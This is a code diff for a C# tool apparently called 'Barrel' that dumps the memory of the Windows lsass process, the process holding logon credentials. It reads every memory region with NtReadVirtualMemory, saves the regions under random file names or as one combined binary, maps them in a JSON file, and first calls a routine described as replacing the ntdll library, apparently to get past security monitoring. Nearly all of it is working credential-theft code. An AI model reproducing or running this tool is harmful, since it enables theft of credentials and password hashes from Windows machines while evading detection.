@@ -2,6 +2,7 @@
 using System.Linq;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using static Barrel.NT;
 
 
 namespace Barrel
@@ -148,7 +149,7 @@ namespace Barrel
         }
 
 
-        static void WriteToFile(byte[] buffer, int bufferSize, string filename)
+        static void WriteToBinFile(byte[] buffer, int bufferSize, string filename)
         {
             // Create to file
             IntPtr hFile;
@@ -235,23 +236,22 @@ namespace Barrel
         static void WriteToFile(string path, string content)
         {
             System.IO.File.WriteAllText(path, content);
-            Console.WriteLine("[+] JSON file generated.");
+            Console.WriteLine("[+] File " + path + " generated.");
         }
 
 
-        static void Main(string[] args)
-        {
-            Console.WriteLine("3 - Barrel");
+        static void Barrel(string file_name, string mem_name, bool big_file) {
             Random random = new Random();
-
             // Create directory for all dump files
-            string path_ = @"" + getRandomString(5, random) + "\\";
-            if (!System.IO.Directory.Exists(path_))
-            {
-                System.IO.Directory.CreateDirectory(path_);
-                Console.WriteLine("[+] Files will be created at " + path_);
+            string path_ = @"" + mem_name;
+            if (!big_file && mem_name == "") {
+                path_ = @"" + getRandomString(5, random) + "\\";
+                if (!System.IO.Directory.Exists(path_))
+                {
+                    System.IO.Directory.CreateDirectory(path_);
+                }
             }
-
+            
             // Get process name
             string procname = "lsass";
 
@@ -284,7 +284,7 @@ namespace Barrel
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
             IntPtr aux_address = IntPtr.Zero;
-            // byte[] aux_bytearray = { };
+            byte[] aux_bytearray = { };
             string[] aux_array_1 = { };
             while ((long)aux_address < proc_max_address_l)
             {
@@ -297,19 +297,65 @@ namespace Barrel
                 {
                     byte[] buffer = new byte[(int)mbi.RegionSize];
                     NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
-                    // Create dump file for this region
                     string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);
-                    WriteToFile(buffer, (int)mbi.RegionSize, (path_ + memdump_filename));
+                    // Create dump file for this region
+                    if (!big_file)
+                    {
+                        WriteToBinFile(buffer, (int)mbi.RegionSize, (path_ + memdump_filename));
+                    }
                     // Add to JSON file                    
                     string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                     aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
+                    // Add to global byte array
+                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
+                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
+                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
+                    aux_bytearray = new_bytearray;
                 }
                 // Next memory region
                 aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
             }
-
+            // Write JSON file
             string barrel_json_content = ToJsonArray(aux_array_1);
-            WriteToFile("barrel.json", barrel_json_content);
+            WriteToFile(file_name, barrel_json_content);
+
+            // Create binary file with all memory regions
+            if (big_file)
+            {
+                if (mem_name == "")
+                {
+                    mem_name = getRandomString(10, random) + "." + getRandomString(3, random);
+                }
+                WriteToBinFile(aux_bytearray, aux_bytearray.Length, mem_name);
+                Console.WriteLine("[+] File created at " + mem_name);
+            }
+            else {
+                Console.WriteLine("[+] Files created at " + path_);
+            }
+        }
+
+
+        static void Main(string[] args)
+        {
+            // Replace ntdll library
+            string option = "default";
+            string wildcard_option = "";
+            if (args.Length >= 1)
+            {
+                option = args[0];
+            }
+            if (args.Length >= 2)
+            {
+                wildcard_option = args[1];
+            }
+            ReplaceLibrary(option, wildcard_option);
+
+            // big_file = true  -> Generate one big file with the dump of all memory regions together
+            // big_file = false -> Create a directory with a random name and generate one dump file for each region
+            bool big_file = true;
+
+            // Get Mem64List information + Dump memory regions. Arguments: Name of JSON file; name of directory/file to contain memory dumps
+            Barrel("barrel.json", "", big_file);
         }
     }
 }
